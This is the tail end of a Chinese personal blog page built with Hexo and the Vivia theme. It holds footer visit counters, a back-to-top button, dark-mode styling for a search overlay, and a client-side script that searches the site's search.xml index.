    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>
<div class="footer-statistics" style="margin-top: 15px; font-size: 0.85rem; color: #888; text-align: center;">
  <span id="busuanzi_container_site_pv" style="display: none;">
    <i class="fa-solid fa-chart-line"></i> 总访问量: <span id="busuanzi_value_site_pv" style="color: var(--color-primary); font-weight: bold;"></span> 次
  </span>
  <span style="margin: 0 10px; opacity: 0.3;">|</span>
  <span id="busuanzi_container_site_uv" style="display: none;">
    <i class="fa-solid fa-users"></i> 总访客数: <span id="busuanzi_value_site_uv" style="color: var(--color-primary); font-weight: bold;"></span> 人
  </span>

  <div style="margin-top: 10px;">
    <a target="_blank" rel="noopener" href="https://info.flagcounter.com/xxxx" style="display:inline-block;">
      <img src="https://s11.flagcounter.com/mini/licivo/bg_FFFFFF/txt_000000/border_CCCCCC/flags_0/" alt="Flag Counter" border="0">
    </a>
    </div>
</div>
    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>

  <script src="/js/light-dark-switch.js"></script>

  <div id="search-form-wrap" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px); z-index: 99999; justify-content: center; align-items: flex-start; padding-top: 80px;">
    <div class="search-container" style="background: var(--color-background, #fff); width: 90%; max-width: 600px; max-height: 80vh; border-radius: 16px; padding: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); display: flex; flex-direction: column; overflow: hidden;">
      <div class="search-header" style="display: flex; align-items: center; border-bottom: 1px solid rgba(0,0,0,0.1); padding-bottom: 15px; margin-bottom: 10px;">
        <input type="text" id="search-input" style="flex: 1; border: none; outline: none; font-size: 1.1rem; background: transparent; color: var(--color-text);" placeholder="搜索文章标题或内容...">
        <i id="search-close-btn" class="fa-solid fa-xmark" style="cursor: pointer; color: #999; font-size: 1.2rem; margin-left: 10px;"></i>
      </div>
      <div id="search-result" style="overflow-y: auto; flex: 1;">
        </div>
    </div>
  </div>

  <style>
    .search-result-list { list-style: none; padding: 5px; margin: 0; }
    .search-result-item { padding: 15px; margin-bottom: 12px; background: rgba(0,0,0,0.02); border-radius: 10px; transition: all 0.2s ease; border: 1px solid transparent; }
    .search-result-item:hover { background: rgba(0,0,0,0.04); box-shadow: 0 4px 12px rgba(0,0,0,0.08); transform: translateY(-2px); border-color: var(--color-primary); }
    .search-result-title { font-size: 1.1rem; font-weight: 600; color: var(--color-primary, #4a90e2); text-decoration: none; display: block; margin-bottom: 8px; }
    .search-result-content { font-size: 0.95rem; color: #666; line-height: 1.6; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    .search-keyword { color: #e91e63; background: rgba(233, 30, 99, 0.08); padding: 0 4px; border-radius: 4px; font-weight: bold; font-style: normal; }
    
    /* 深色模式适配 */
    [data-theme="dark"] .search-container { background: #222; border: 1px solid #444; }
    [data-theme="dark"] .search-result-item { background: rgba(255,255,255,0.05); }
    [data-theme="dark"] .search-result-item:hover { background: rgba(255,255,255,0.08); }
    [data-theme="dark"] .search-result-content { color: #aaa; }
    
    /* 滚动条美化 */
    #search-result::-webkit-scrollbar { width: 6px; }
    #search-result::-webkit-scrollbar-thumb { background: #ccc; border-radius: 3px; }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const searchBtn = document.getElementById('nav-search-btn');
      const searchForm = document.getElementById('search-form-wrap');
      const searchClose = document.getElementById('search-close-btn');
      const searchInput = document.getElementById('search-input');
      const searchResult = document.getElementById('search-result');

      if (!searchBtn || !searchForm) return;

      // 1. 弹出逻辑：增加 e.preventDefault() 解决跳转问题
      searchBtn.onclick = function(e) {
        e.preventDefault(); // 阻止默认的跳转到页面末尾的行为
        searchForm.style.display = 'flex';
        searchInput.focus();
        if (!window.searchData) loadSearchData();
      };

      searchClose.onclick = () => { searchForm.style.display = 'none'; };
      
      // 点击遮罩层（弹窗外）关闭
      searchForm.onclick = (e) => { 
        if(e.target === searchForm) searchForm.style.display = 'none'; 
      };

      // 按下 Esc 键关闭
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') searchForm.style.display = 'none';
      });

      // 2. 搜索逻辑 (Local Search)
      async function loadSearchData() {
        searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:#999;">正在加载索引...</div>';
        try {
          const res = await fetch('/search.xml');
          const text = await res.text();
          const xml = new DOMParser().parseFromString(text, "text/xml");
          window.searchData = Array.from(xml.querySelectorAll('entry')).map(entry => ({
            title: entry.querySelector('title').textContent,
            content: entry.querySelector('content').textContent.replace(/<[^>]+>/g, ''), // 过滤 HTML 标签
            url: entry.querySelector('url').textContent
          }));
          searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:#999;">索引加载完成</div>';
        } catch (err) {
          searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:red;">索引加载失败，请检查 search.xml</div>';
        }
      }

      searchInput.oninput = function() {
        const val = this.value.trim().toLowerCase();
        if (val.length < 2) { searchResult.innerHTML = ""; return; }
        
        const results = window.searchData.filter(data => 
          data.title.toLowerCase().includes(val) || data.content.toLowerCase().includes(val)
        );

        if (results.length === 0) {
          searchResult.innerHTML = '<div style="padding:20px; text-align:center; color:#999;">未找到相关文章</div>';
          return;
        }

        searchResult.innerHTML = `<ul class="search-result-list">${results.map(data => `
          <li class="search-result-item">
            <a href="${data.url}" class="search-result-title">${data.title.replace(new RegExp(val, 'gi'), m => `<em class="search-keyword">${m}</em>`)}</a>
            <p class="search-result-content">${data.content.substring(0, 150)}...</p>
          </li>`).join('')}</ul>`;
      };
    });
  </script>
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</body>
</html>